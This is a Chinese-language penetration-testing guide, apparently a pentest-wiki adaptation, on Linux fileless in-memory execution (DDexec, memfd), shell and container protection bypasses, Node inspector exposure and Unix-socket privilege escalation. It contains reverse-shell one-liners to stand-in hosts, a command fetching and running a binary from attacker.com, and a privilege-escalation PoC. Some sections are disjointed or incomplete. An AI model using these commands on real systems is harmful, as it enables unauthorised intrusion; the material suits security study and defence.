## 1. 内存执行与进程注入技术

### 1.1 DDexec / EverythingExec 原理与利用

#### 背景

在 Linux 中，要运行一个程序，它必须作为文件存在于文件系统层次结构中（`execve()` 的工作方式）。这使得控制 Linux 系统上运行的内容变得容易，便于检测威胁或阻止未授权执行。

**但这项技术将改变这一切。如果你无法启动想要的进程……那么就劫持一个已经存在的进程。**

这项技术允许你**绕过常见的保护技术，如只读、不可执行、文件名白名单、哈希白名单等**。

#### 依赖项

```
dd
bash | zsh | ash (busybox)
head
tail
cut
grep
od
readlink
wc
tr
base64
```

#### 技术原理

如果你能够任意修改进程的内存，那么你就可以接管它。这可以用来劫持一个已经存在的进程并用另一个程序替换它。可以通过以下方式实现：

- 使用 `ptrace()` 系统调用（需要能够执行系统调用或系统上有 gdb 可用）
- 更有趣的是，通过写入 `/proc/$pid/mem`

文件 `/proc/$pid/mem` 是进程整个地址空间的一对一映射。在偏移量 `x` 处读取或写入此文件等同于在虚拟地址 `x` 处读取或修改内容。

#### 四个基本问题及解决方案

1. **权限问题**：通常只有 root 和程序所有者才能修改 → 大多数 shell 解释器允许创建文件描述符，然后由子进程继承。我们可以创建一个指向 shell 的 `mem` 文件并具有写权限的文件描述符。
2. **ASLR**：可以检查 shell 的 `maps` 文件或 procfs 中的任何其他文件，获取进程地址空间信息。
3. **未映射地址**：需要对文件进行 `lseek()`，在 shell 中使用 `dd` 完成。

#### 详细步骤

1. 解析要运行的二进制文件和加载器，找出需要哪些映射
2. 制作"shellcode"，执行内核在每次 `execve()` 时执行的相同步骤：
   - 创建所述映射
   - 将二进制文件读入其中
   - 设置权限
   - 初始化栈，并放置辅助向量（加载器需要）
   - 跳转到加载器，让它完成其余工作
3. 从 `syscall` 文件获取进程执行当前系统调用后将返回的地址
4. 用 shellcode 覆盖该位置（通过 `mem` 可以修改不可写的页面）
5. 将要运行的程序传递给进程的 stdin
6. 由加载器负责加载程序所需的库并跳转到其中

#### dd 替代品

dd 有几个替代品，其中一个是 tail，目前是用于在 mem 文件中 `lseek()` 的默认程序（这是使用 dd 的唯一目的）。所述替代品有：

- tail
- hexdump
- cmp
- xxd

设置变量 `SEEKER` 可以更改使用的 seek 工具，例如：

```bash
SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
```

如果你发现脚本中未实现的另一个有效的 seek 工具，你仍然可以通过设置 `SEEKER_ARGS` 变量来使用它：

```bash
SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
```

#### 使用方法

```bash
# 基本用法
SEEKER=dd bash ddexec.sh <binary_to_execute> <args>

# 使用不同的 seek 工具
SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
SEEKER=tail bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
SEEKER=hexdump bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
SEEKER=xxd bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)

# 使用自定义 SEEKER 参数
SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)

# 从网络下载并执行
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

### 1.2 MemExec 守护进程化内存执行

Memexec 是 DDexec 的自然下一步。它是一个守护进程化的 DDexec shellcode，因此每次您想要运行不同的二进制文件时，不需要重新启动 DDexec，您可以通过 DDexec 技术运行 memexec shellcode，然后与该守护进程通信以传递新的二进制文件进行加载和运行。

您可以在 [https://github.com/arget13/memexec](https://github.com/arget13/memexec) 找到如何使用 memexec 从 PHP 反弹 shell 执行二进制文件的示例。

---

### 1.3 Memdlopen 内存加载与依赖解析

与 DDexec 的用途类似，memdlopen 技术提供了一种更简单的方式来在内存中加载二进制文件并随后执行它们。它甚至可以加载带有依赖项的二进制文件。

---

### 1.4 待执行载荷存储技术

在某些场景下，攻击者可能需要将载荷存储在内存中等待执行，而非写入磁盘。常见技术包括：

| 技术 | 说明 |
|------|------|
| **memfd_create** | 创建匿名内存文件描述符，不映射到文件系统 |
| **/dev/shm** | 利用共享内存，通常可写但不可执行 |
| **进程注入** | 通过 ptrace 或 `/proc/pid/mem` 注入代码到运行中的进程 |
| **DDexec** | 劫持现有进程执行任意代码 |

这些技术常用于绕过文件系统级别的安全检测（如只读文件系统、完整性监控等）。

#### FD + exec 系统调用

如果机器内有一些强大的脚本引擎，如 Python、Perl 或 Ruby，您可以将要执行的二进制文件下载到内存中，将其存储在内存文件描述符中（`create_memfd` 系统调用），该文件描述符不会受到这些保护，然后调用 exec 系统调用，指定该 fd 作为要执行的文件。

为此，您可以轻松使用项目 **fileless-elf-exec**。您可以传递一个二进制文件，它将生成指定语言的脚本，其中二进制文件已压缩并进行 base64 编码，并包含解码和解压缩到通过调用 `create_memfd` 系统调用创建的 fd 中的指令，以及调用 exec 系统调用来运行它。

### 2.1 受限 Bash（rbash）限制机制与逃逸思路

受限 bash（rbash）是一种受限的 shell 环境，限制用户：

- 不能使用 `cd` 命令
- 不能更改 `PATH`、`SHELL`、`BASH_ENV` 或 `ENV` 环境变量
- 不能使用包含 `/` 的命令名
- 不能重定向输出

### 3.6 Bash NOP 滑板（Bashsledding）

当漏洞让您部分控制最终到达 `system()` 或其他 shell 的参数时，Bash 会在执行命令之前无害地忽略前导空白。因此可以在真实命令前加上长串空格作为 NOP 滑板：

```bash
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× 空格 ───┘ ↑ 真实命令
```

实际用例：
1. **内存映射配置块**（例如 NVRAM），可跨进程访问。
2. 攻击者无法写入 NULL 字节来对齐有效载荷的情况。
3. 仅提供 BusyBox `ash`/`sh` 的嵌入式设备——它们也会忽略前导空格。

## 4. 文件系统保护机制绕过

### 4.1 只读文件系统（ReadOnly）绕过

越来越多的 Linux 机器以只读（ro）文件系统保护方式挂载，特别是在容器中。Kubernetes 中通过 `readOnlyRootFilesystem: true` 配置。但 `/dev/shm` 通常仍然可写（虽然不可执行）。

```bash
# 检查只读挂载
mount | grep -E "ro,"

# 尝试重新挂载为读写
mount -o remount,rw / 2>/dev/null
mount -o remount,rw /tmp 2>/dev/null
mount -o remount,rw /proc/sys 2>/dev/null

# 利用内存文件系统
# /dev/shm 通常是可写的
```

#### 脚本绕过

只要解释器存在，就可以**执行任何脚本**（shell 脚本、Python 脚本等），二进制限制不影响脚本执行。

#### 内存执行绕过

如果您想执行二进制文件但文件系统不允许，最好的方法是从内存执行，因为保护措施不适用于内存。参考 **1.1 DDexec** 和 **1.4 待执行载荷存储技术**。

### 4.3 路径屏蔽（Masked Paths）绕过

容器运行时会在 `/proc` 中屏蔽一些敏感路径，防止容器内进程读取主机信息。

#### 常见被屏蔽的路径

- `/proc/kcore`
- `/proc/keys`
- `/proc/latency_stats`
- `/proc/timer_list`
- `/proc/timer_stats`
- `/proc/sched_debug`
- `/proc/scsi`

#### 绕过方法

```bash
# 检查哪些路径被屏蔽
cat /proc/1/mountinfo | grep /proc

# 通过 /proc/self 获取信息
cat /proc/self/status
cat /proc/self/cgroup
cat /proc/self/mountinfo

# 利用容器内进程的 /proc
ls -la /proc/[pid]/root
```

### 4.4 受限路径劫持与 PATH 操作

某些系统配置了只读文件系统（如只读挂载的 `/usr`），但这可能导致特定的安全问题。在只读路径上运行的服务可能存在路径劫持机会。

路径屏蔽是一种安全措施，通过限制可执行文件的搜索路径来防止路径劫持攻击。但可通过以下方式绕过：

```bash
# 检查当前 PATH
```

## 8. 调试器与开发工具滥用

### 8.1 Node.js Inspector/Debugger RCE

当使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。默认情况下，它将在 `127.0.0.1:9229` 的主机和端口上监听。每个进程还会被分配一个唯一的 UUID。

> **警告**：由于调试器对 Node.js 执行环境有完全访问权限，能够连接到此端口的恶意行为者可能代表 Node.js 进程执行任意代码（潜在的权限提升）。

#### 启动检查器的方式

```bash

node --inspect=4444 app.js # 将在端口 4444 上运行检查器
node --inspect=0.0.0.0:4444 app.js # 将在所有网络接口和端口 4444 上运行检查器
node --inspect-brk=0.0.0.0:4444 app.js # 将在所有网络接口和端口 4444 上运行检查器
# --inspect-brk 等同于 --inspect

node --inspect --inspect-port=0 app.js # 将在随机端口上运行检查器
# 注意：不带 "--inspect" 或 "--inspect-brk" 使用 "--inspect-port" 不会运行检查器
```


> **提示**：这在容器中很有用，因为关闭进程并启动一个带 `--inspect` 的新进程不是可行选项，因为容器会随进程一起被终止。

### 9.1 Unix 域套接字命令注入

#### 使用 Python 的套接字绑定示例

在以下示例中，创建了一个 unix 套接字（`/tmp/socket_test.s`），所有接收到的内容都将通过 `os.system` 执行。

```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
  os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

### 9.2 Root 特权套接字信号触发提权

某些特权守护进程暴露了 root 拥有的 UNIX 套接字，该套接字接受不受信任的输入，并将特权操作与线程 ID 和信号耦合。如果协议允许非特权客户端影响目标本地线程，您可能能够触发特权代码路径并进行提权。

观察到的模式：
- 连接到 root 拥有的套接字（例如，`/tmp/remotelogger`）
- 创建一个线程并获取其本地线程 ID（TID）
- 发送 TID（打包的）加填充作为请求；接收确认
- 向该 TID 发送特定信号以触发特权行为

#### 最小 PoC 代码

```python
import socket, struct, os, threading, time
# 生成一个线程以便我们可以向其发送信号
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # 同步
os.kill(tid, 4)  # 发送 SIGILL（案例中的示例）
```

要将此转化为 root shell，可以使用简单的命名管道+nc 模式：

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```

#### 注意事项

- 这类漏洞源于信任从非特权客户端状态派生的值（TID），并将其绑定到特权信号处理器或逻辑
- 通过在套接字上强制执行凭据、验证消息格式以及将特权操作与外部提供的线程标识符解耦来进行加固

## 10. 容器与无发行版环境渗透

### 10.1 无发行版（Distroless）容器环境特点与限制

无发行版容器仅包含运行特定应用程序或服务所需的最基本组件，如库和运行时依赖项，但排除了较大的组件，如包管理器、shell 或系统实用程序。

无发行版容器的目标是通过消除不必要的组件来减少容器的攻击面，并最小化可被利用的漏洞数量。

**限制**：
- 您可能甚至找不到 sh 或 bash 来获取常规 shell
- 您也不会找到 ls、whoami、id 等二进制文件——所有您通常在系统上运行的东西
- 因此，您将无法像通常那样获取反弹 shell 或枚举系统

---

### 10.2 脚本语言获取交互式 Shell

如果被入侵的容器例如运行 Flask Web，则 Python 已安装，因此您可以获取 Python 反弹 shell。如果它运行 Node，您可以获取 Node 反弹 shell，对于大多数脚本语言也是如此。

> **提示**：使用脚本语言，您可以利用语言能力枚举系统。

如果没有只读/不可执行保护，您可以利用反弹 shell 将二进制文件写入文件系统并执行它们。

> **提示**：然而，在这种容器中，这些保护通常会存在，但您可以使用前面的内存执行技术来绕过它们。

您可以在 [https://github.com/carlospolop/DistrolessRCE](https://github.com/carlospolop/DistrolessRCE) 找到如何利用一些 RCE 漏洞获取脚本语言反弹 shell 并从内存执行二进制文件的示例。

### 10.3 内存执行技术在无发行版中的应用

在无发行版容器中，结合内存执行技术（DDexec、MemExec、Memdlopen 等）可以绕过只读/不可执行保护，实现任意代码执行。
